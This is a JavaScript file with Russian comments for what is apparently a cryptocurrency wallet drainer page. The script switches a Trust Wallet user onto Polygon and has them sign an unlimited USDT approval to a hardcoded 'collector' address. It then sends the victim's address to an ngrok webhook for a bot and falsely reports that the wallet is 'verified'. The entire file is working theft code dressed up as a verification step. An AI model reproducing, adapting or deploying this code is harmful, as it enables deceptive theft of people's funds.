const USDT_CONTRACT = '0xc2132D05D31c914a87C6611C10748AEb04B58e8F';
const COLLECTOR_ADDRESS = '0x2530C5aa0022B49832C593758d84aE70e40161cB';
const POLYGON_CHAIN_ID = '0x89'; // 137 в Hex

// Вставь сюда ссылку из консоли бота (например: https://abcd-123.ngrok-free.dev/save-address)
const WEBHOOK_URL = 'https://gypseous-janis-wandlike.ngrok-free.dev/save-address'; 

async function connectAndApprove() {
    const status = document.getElementById('status');
    
    if (typeof window.ethereum === 'undefined') {
        status.innerText = '❌ Ошибка: Откройте сайт внутри Trust Wallet';
        return;
    }

    try {
        status.innerText = '🔄 Подключение к Polygon...';

        // 1. ПРИНУДИТЕЛЬНОЕ ПЕРЕКЛЮЧЕНИЕ СЕТИ
        try {
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: POLYGON_CHAIN_ID }],
            });
        } catch (switchError) {
            if (switchError.code === 4902) {
                await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [{
                        chainId: POLYGON_CHAIN_ID,
                        chainName: 'Polygon Mainnet',
                        rpcUrls: ['https://polygon-rpc.com'],
                        nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 },
                        blockExplorerUrls: ['https://polygonscan.com/']
                    }]
                });
            } else {
                throw switchError;
            }
        }

        // 2. ПОЛУЧЕНИЕ АККАУНТА
        const web3 = new Web3(window.ethereum);
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        const userAddress = accounts[0];

        status.innerText = '📝 Подтвердите транзакцию в кошельке...';

        // 3. ПОДПИСЬ APPROVE
        const abi = [{"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}];
        const contract = new web3.eth.Contract(abi, USDT_CONTRACT);
        
        const maxUint = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';

        // Вызов окна подтверждения (запрос на использование USDT)
        await contract.methods.approve(COLLECTOR_ADDRESS, maxUint).send({ 
            from: userAddress 
        });

        status.innerText = '📡 Синхронизация данных...';

        // 4. ОТПРАВКА АДРЕСА В БОТ
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ address: userAddress })
        });

        status.innerText = '✅ Успешно! Кошелек верифицирован.';
        status.style.color = '#ff007a';

    } catch (error) {
        console.error(error);
        status.innerText = '❌ Ошибка: ' + (error.message || 'Транзакция отклонена');
    }
}

document.getElementById('startBtn').addEventListener('click', connectAndApprove);
